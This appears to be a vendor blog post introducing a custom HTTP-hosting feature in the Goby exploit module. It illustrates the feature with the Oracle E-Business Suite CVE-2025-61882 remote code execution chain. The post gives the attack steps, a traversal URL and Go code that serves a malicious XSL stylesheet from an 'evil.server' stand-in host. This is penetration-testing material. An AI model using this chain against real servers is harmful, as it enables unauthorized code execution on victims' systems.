# Foreword

In practical vulnerability research and penetration testing scenarios, the exploitation of many vulnerabilities relies on the critical step of "the target server actively sending requests to a specified entity." Whether it involves data exfiltration for blind vulnerabilities or triggering remote code execution in deserialization vulnerabilities, a publicly accessible entity is required as an interaction node.

However, most security practitioners face the common pain point of "lacking a public network environment": personal testing devices often lack public IP addresses, and setting up temporary public servers is cumbersome, severely impacting the efficiency of vulnerability research. To address this core challenge, the Goby EXP module can easily invoke public servers (e.g., DNSlog, HTTP request, malicious XML, JNDI injection, reverse shell, etc.) to achieve various methods of vulnerability exploitation, significantly reducing the cost and technical threshold of penetration testing.

# Path Adaptation Challenges Arising from a Vulnerability Exploitation Study

During recent routine vulnerability research by the security team, we encountered a limitation in a custom URL scenario: CVE-2025-61882 is an authentication-free remote code execution vulnerability chain in Oracle E-Business Suite (EBS). According to public technical analysis, this CVE is not a single vulnerability but a combination of multiple vulnerabilities. The general exploitation steps are as follows:

![img](https://img.cdn1.vip/i/691d7059986cb_1763536985.webp)

1. SSRF (Server-Side Request Forgery)
   The attack begins with an SSRF vulnerability in `/OA_HTML/configurator/UiServiet`. By sending a specially crafted XML document to this service, an attacker can cause Oracle E-Business Suite (EBS) to initiate HTTP requests to any specified URL. This gives the attacker a "messenger" capable of making network requests from within the target server, opening the first door to probing and attacking internal services.
2. CRLF Injection
   The initial SSRF vulnerability has significant limitations; it does not allow control over request headers or POST data. To overcome these restrictions, CRLF injection is used. This technique allows "forging" new lines within the HTTP request stream, enabling the injection of custom HTTP headers and POST data, effectively enhancing the SSRF vulnerability.
3. Authentication Bypass
   After obtaining a powerful SSRF capability, the next step is to access an internal service running on port 7201 on the server. This service is bound to a private IP mapped to the fixed domain `apps.example.com`. The target file path is `/OA_HTML/ieshostedsurvey.jsp`. Since the `/help/` path does not require authentication, a common path traversal (`../`) can successfully bypass the authentication whitelist. Thus, the final SSRF request URL becomes `http://apps.example.com:7201/OA_HTML/help/../ieshostedsurvey.jsp`.
4. XSLT Injection
   The final stage of the attack targets a security flaw in the `ieshostedsurvey.jsp` file. This file dynamically constructs a URL based on the Host header in the HTTP request to fetch and process an XSLT stylesheet. The powerful SSRF allows complete control over the request headers, directing them to a malicious server controlled by the attacker. Ultimately, the target server downloads and executes an XSL file containing dangerous code from this malicious server. Because XSLT processing in Java can call templates and extension functions, the ability to load an untrusted stylesheet allows the attacker to achieve arbitrary remote code execution. 

**The key point for code execution in this vulnerability is that the target server requests the file `/OA_HTML/help/../ieshostelsurvey.xsl` from the malicious server and executes the response.**

At this stage, an attempt was made to use the HostFilemethod for custom URL generation:

```
err := godclient.HostFile(randomStr+".xsl", `file_content`, func(fileURL string) error {
    // The fileURL is the path for file upload（http://evil.server/i/randstr/randomStr.xsl）
	resp, err := otherrequest(hostInfo, fileURL)
	if resp != nil {
		fmt.Println("true")
	}
	return err
})
```

After progressing to this point in the research and experiencing multiple failed exploitation attempts, we discovered that during the URL generation phase, the service generates a path with a prefix attached, such as: i/123456/OA_HTML/ieshostedsurvey.xsl. This caused the target to be unable to retrieve the corresponding payload from the file /OA_HTML/ieshostedsurvey.xsl on the malicious server. **This limitation, when facing vulnerability targets with "fixed paths," directly leads to a break in the exploitation chain.**

The original design intention of the fixed prefix was to avoid conflicts between custom paths set by different users. However, in more flexible and practical combat scenarios, the current capability cannot provide corresponding strategies. To address this issue, the Goby EXP module requires further capability upgrades.



# A Breakthrough in New Capability: Independent Service Instances Enable Fixed Path Customization

The new version of the Goby EXP module introduces an enhancement: **the addition of independent service instances (`CreateCustomHttp` method)**. This retains the core advantages of the original system while adding the capability for fixed path customization. Its core functional matrix is as follows:
![img](https://img.cdn1.vip/i/691d705b4bf9b_1763536987.webp)
**The `CreateCustomHttp` method brings two key improvements:**
First, users can now purely customize paths, such as `/OA_HTML/ieshostedsurvey.xsl`, perfectly matching the specific path requirements of the vulnerability target. 

Second, independent service instances avoid the issue of path conflicts between multiple users – each custom path corresponds to an independent thread. Even if different users set the same path, service isolation ensures the target server can accurately identify and respond.
Here is an intuitive comparison between the previous `HostFile` method and the new `CreateCustomHttp` method:

|                         | **HostFile Method**                             | **CreateCustomHttp Method**                        |
| ----------------------- | ----------------------------------------------- | -------------------------------------------------- |
| Multiple Routes Support | Not Supported                                   | Can create multiple routes at once                 |
| URL Format              | Fixed format: `{xxxx}/i/{random id}/{filename}` | Supports setting arbitrary route paths             |
| Response Content        | Can only return specified file content          | Each route can return different content            |
| Status Code             | Only supports returning 200 status code         | Supports any status code in the 100-599 range      |
| Headers                 | Cannot customize headers                        | Supports setting arbitrary response headers        |
| Response Delay          | Not Supported                                   | Supports setting response delay time               |
| HTTP Methods            | Not Supported                                   | Supports GET, POST, PUT, DELETE, and other methods |

Next, we demonstrate the application of the `CreateCustomHttp` method in actual EXP writing scenarios:

## Demonstration of CreateCustomHttp Usage with CVE-2025-61882 Exploitation Example

Example `CreateCustomHttp` code:

```
req := godclient.CustomHttpRouteReq{
			Routes: []godclient.CustomHttpRoute{
				{
					Path:        "/OA_HTML/ieshostedsurvey.xsl",
					Method:      "GET",
					ContentType: "text/html; charset=utf-8",
					Content:     xslPayload,
					StatusCode:  200,
				},
			},
			Timeout: 60,
		}
// Access the interface  evilServerHost/OA_HTML/ieshostedsurvey.xsl
evilServerHost, err := godclient.CreateCustomHttp(req)
```

Addressing the research problem from the previous chapter, after using the `CreateCustomHttp` method for the key exploitation step and sending the packet, accessing the custom interface on the remote server shows that the custom HTTP service successfully returns the corresponding XSLT stylesheet. The achieved effect is shown in the figure:
![img](https://alidocs.dingtalk.com/core/api/resources/img/5eecdaf48460cde5e0d6c9e47e9d714596355eaaf696f63075b8339e1c4c2483f3677ae38e65e2c18d68742cd653602aaac77b6f1abe50df859f3c5e0ed5d9ae3e82485dd8884ceb4822caa1f1c9954f6602c3b75793d0adecb2deadd7030b9e?tmpCode=3358d98c-6d46-40dd-978c-12b5009f1023)

The final one-click exploitation effect in Goby is demonstrated as follows:
![img](https://img.cdn1.vip/i/691d71210a348_1763537185.webp)


Beyond the above case, with the `CreateCustomHttp` method, the Goby EXP module can now flexibly handle more practical scenarios. We welcome fellow researchers to explore and discover its potential.

# Summary

This article introduced the capability upgrade of the Goby EXP module in the practical application targeting CVE-2025-61882. Regarding custom services, we plan to introduce more flexible upgrade solutions combining additional practical scenarios, such as FTP, fake MySQL, etc. Please look forward to the second technical sharing session!

We also welcome fellow researchers to communicate any issues or suggestions encountered while using the Goby EXP module. The Bot will collect your questions and recommendations to guide our future upgrade directions.
